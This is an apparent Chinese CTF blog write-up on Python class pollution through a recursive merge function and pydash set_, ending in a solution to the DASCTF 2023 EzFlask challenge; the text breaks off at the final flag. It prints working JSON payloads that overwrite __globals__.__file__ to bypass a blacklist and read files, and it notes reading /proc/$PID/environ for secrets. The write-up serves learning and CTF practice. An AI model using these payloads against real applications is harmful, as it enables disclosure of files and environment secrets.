    <content type="html"><![CDATA[<h1 id="python原型链污染"><a class="markdownIt-Anchor" href="#python原型链污染">#</a> python 原型链污染</h1><p>​后面会有跟着 Article_kelp 慢慢操作的，前面先面向题目学习。</p><h2 id="背景"><a class="markdownIt-Anchor" href="#背景">#</a> 背景：</h2><p>​国赛遇到了这个考点，然后之后的 DASCTF 夏季挑战赛也碰到了，抓紧粗略学一手，学了 JavaScript 之后再深究原型链污染。</p><h2 id="简介"><a class="markdownIt-Anchor" href="#简介">#</a> 简介：</h2><p>​python 中的原型链污染是指通过修改对象原型链中的属性，对程序的行为产生以外影响或利用漏洞进行攻击的一种技术。</p><p>​在 Python 中，对象的属性和方法可以通过原型链继承来获取。每个对象都有一个原型，原型上定义了对象可以访问的属性和方法。当对象访问属性或方法时，会先在自身查找，如果找不到就会去原型链上的上级对象中查找，原型链污染攻击的思路是通过修改对象原型链中的属性，使得程序在访问属性或方法时得到不符合预期的结果。常见的原型链污染攻击包括修改内置对象的原型、修改全局对象的原型等</p><p>​这个知识点应用的范围比较小，仅当题目中出现 <code>utils</code>  的 <code>merge</code>  或 <code>Pydash(5.1.2)</code>  模块中的 <code>set</code>  和 <code>set_with</code>  函数才会用上。</p><h2 id="merge没遇到过具体题型先简单说下"><a class="markdownIt-Anchor" href="#merge没遇到过具体题型先简单说下">#</a> merge（没遇到过具体题型，先简单说下）：</h2><p>​首先是下面这个程序，可以再 merge 打个断点，debug 试试看：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>:</span><br><span class="line">    secret = <span class="string">&quot;hello&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_a</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_b</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line">instance = son_b()</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;secret&quot;</span> : <span class="string">&quot;world&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(son_a.secret)</span><br><span class="line"><span class="comment">#hello</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret)</span><br><span class="line"><span class="comment">#hello</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(son_a.secret)</span><br><span class="line"><span class="comment">#world</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret)</span><br><span class="line"><span class="comment">#world</span></span><br><span class="line"><span class="built_in">print</span>(father.secret)</span><br><span class="line"><span class="comment">#world</span></span><br></pre></td></tr></table></figure><p>​这就是一个简单的污染 father 类的 secret 属性的一个程序，可以看到的是，最后 father.secret 确实是被污染了。</p><p>​当然，内置属性例如 __str__，</p><p>​<strong>特别注意：</strong></p><p>​并不是所有的类的属性都可以被污染，如 <code>Object</code>  的属性就无法被污染，所以需要目标类能够被切入点类或对象可以通过属性值查找获取到</p><blockquote><p><strong>大佬是这么说的</strong></p><p>通过断点调试可以看出这个 merge 函数在走到 hasattr 处，由于我们的 payload 是一层字典套一层字典，就会递归调用 merge，并且由于 getattr (dst,k)，dst 就在一直按着 payload 的键发生变化，从到类，再到父类，最后把父类的 secret 赋值为 polluted，成功实现了原型链污染。</p><p>payload 也很好理解，其实就是利用了 python 的链式继承关系，最后找到这个类即可，和 SSTI 通过链式继承关系找 os 模块很像。</p><p>类的内置属性，如 <code>__str__</code> 也可以被污染，但是需要注意，并不是所有类的属性都可以被污染，比如 <code>Object</code>  就无法被污染。</p></blockquote><h2 id="pydash512"><a class="markdownIt-Anchor" href="#pydash512">#</a> pydash(5.1.2)：</h2><p>​由于暂时不会 Sanic 框架的编写，所以先暂时用下 flask 框架， 差距应该不大。</p><p>​先看看下面这个代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pydash <span class="keyword">import</span> set_</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Father</span>:</span><br><span class="line">    secret_value = <span class="string">&quot;safe&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollution</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">pollutant = Pollution()</span><br><span class="line">father = Father()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;key&quot;</span> : <span class="string">&quot;__class__.__init__.__globals__.father.secret_value&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span> : <span class="string">&quot;polluted&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">key = payload[<span class="string">&quot;key&quot;</span>]</span><br><span class="line">value = payload[<span class="string">&quot;value&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(father.secret_value)</span><br><span class="line"><span class="comment">#safe</span></span><br><span class="line">set_(pollutant,key, value)</span><br><span class="line"><span class="built_in">print</span>(father.secret_value)</span><br><span class="line"><span class="comment">#polluted</span></span><br></pre></td></tr></table></figure><p>​如上，我们最后成功污染了 Father 类的 secret_value 属性，大概思路就是通过 key 里的这个链子去找到 father.secret_value 这个属性，然后进行污染，污染为 value 的值。</p><p>​也正因为如此，所以写一个 Web 服务来试试看：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> pydash <span class="keyword">import</span> set_</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/pollute&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Pollution</span>():</span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">r&quot;key&quot;</span>: <span class="string">r&quot;__init__.__globals__.__file__&quot;</span>,</span><br><span class="line">        <span class="string">r&quot;value&quot;</span>: <span class="string">r&quot;D:\html study\PyCharm Project\flask_pydash1\flag&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    key = payload[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">    value = payload[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">    pollute = Pollute()</span><br><span class="line">    set_(pollute,key,value)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Finished pollute &quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>​不知为何，这里写的 Web 服务中，Pollution () 这里传入 reqeust 参数总是会出错，所以这里就用这种方式直接规定了 key 和 value 的值，作为一种输入方式。</p><p>​首先第一次访问根路由，得到的页面如下：</p><p><img data-src="https://i-blog.csdnimg.cn/direct/188c10d495a342d4927f7d8a8b841d58.png#pic_center" alt="在这里插入图片描述"></p><p>​之后，尝试访问下 /pollute 路由，返回了一个 Finished pollute ，随后再去访问下根路由，得到的如下：</p><p><img data-src="https://i-blog.csdnimg.cn/direct/e35d4eadef714422b7670dcc405fc905.png#pic_center" alt="在这里插入图片描述"></p><p>​成功读取到了我提前准备的 flag。</p><p>​原因就是因为在__globals__里找到了__file__属性，然后才能进行污染。</p><h2 id="dasctf-2023-0x401七月暑期挑战赛ezflask"><a class="markdownIt-Anchor" href="#dasctf-2023-0x401七月暑期挑战赛ezflask">#</a> [DASCTF 2023 &amp; 0X401 七月暑期挑战赛] EzFlask：</h2><p>​（小声嘀咕）：前面才刚说了没遇到 merge 的题，这就遇到了。</p><p>​首先，打开就是源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> self.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> self.password == data[<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">Users = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)</span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> Users:</span><br><span class="line">                <span class="keyword">if</span> user.check(data):</span><br><span class="line">                    session[<span class="string">&quot;username&quot;</span>] = data[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Login Success&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5010</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​审计一下，发现了几个点，首先是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br></pre></td></tr></table></figure><p>​就像最开始说的那样，存在 merge 函数，然后下一个有用的信息是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br></pre></td></tr></table></figure><p>​读取了内置属性 __file__ 的值，最后一个重要的信息是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)</span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br></pre></td></tr></table></figure><p>​这里发现，在该函数中调用了 merge () 函数，并且，data 可控，那么，payload 应该就显而易见了：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;a&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;b&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;__class__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;__file__&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;/flag&quot;</span>#当flag在根目录下以及flag文件名知道的情况下</span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img data-src="https://i-blog.csdnimg.cn/direct/283dc0e8e2fa4c809e8dd7356a9cfe04.png#pic_center" alt="在这里插入图片描述"></p><p>​但是，上传却失败了？（这儿可能会出现两个问题，除了黑名单本身的问题外，还有个重点问题，也会导致失败，就是一定要把 Content-Type 修改为<strong> application/json</strong>）看看这儿：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br></pre></td></tr></table></figure><p>​虽然挺明显的，但还是很阴。很显然，在 check 函数下，有个与黑名单的比较，推测应该是这儿过不了，不过，当我们依次把那几个变量修改一下之后，发现，当 <code>__init__</code> 被修改成 <code>__int__</code> 后，返回的是 Register Success，所以，这里似乎只需要绕过 <code>__init__</code> 就行了，先做如下测试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line"><span class="built_in">print</span>(a.__class__.check.__globals__)</span><br><span class="line"></span><br><span class="line"><span class="comment">#&#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;_frozen_importlib_external.SourceFileLoader object at 0x00000122A3EB56D0&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;__file__&#x27;: &#x27;D:\\html study\\PyCharm Project\\flask_pydash1\\test.py&#x27;, &#x27;__cached__&#x27;: None, &#x27;A&#x27;: &lt;class &#x27;__main__.A&#x27;&gt;, &#x27;a&#x27;: &lt;__main__.A object at 0x00000122A405FA50&gt;&#125;</span></span><br></pre></td></tr></table></figure><p>​发现我们可以通过对象的方法来获取 <code>__globals__</code> 全局变量，所以 payload 可以如下构造：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;a&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;b&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;__class__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;check&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;__file__&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;/flag&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​但是最后读取根路由的时候出现了哥问题，那就是，flag 文件名不对。</p><p><img data-src="https://i-blog.csdnimg.cn/direct/f39a01d5d0ed4bbaac39251c83970cdc.png#pic_center" alt="在这里插入图片描述"></p><p>​令人窒息的操作。不过有一点儿或许有点儿希望，那就是环境变量，如果环境变量里面也没有的话，那我可就真没法了，说干就干，首先，环境变量可以通过  <code>/proc/$PID/environ</code>  来读取，这里推测有可能需要用到爆破。</p><p><img data-src="https://i-blog.csdnimg.cn/direct/5d2180dbf885469a822d061ec3e4c913.png#pic_center" alt="在这里插入图片描述"></p><p>​之后读取根路由：</p><p><img data-src="https://i-blog.csdnimg.cn/direct/dfd34f6d7e2f4a6bbdbbe3c0491905c5.png#pic_center" alt="在这里插入图片描述"></p><p>​运气好，flag 刚好就在环境变量里。flag 如下：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 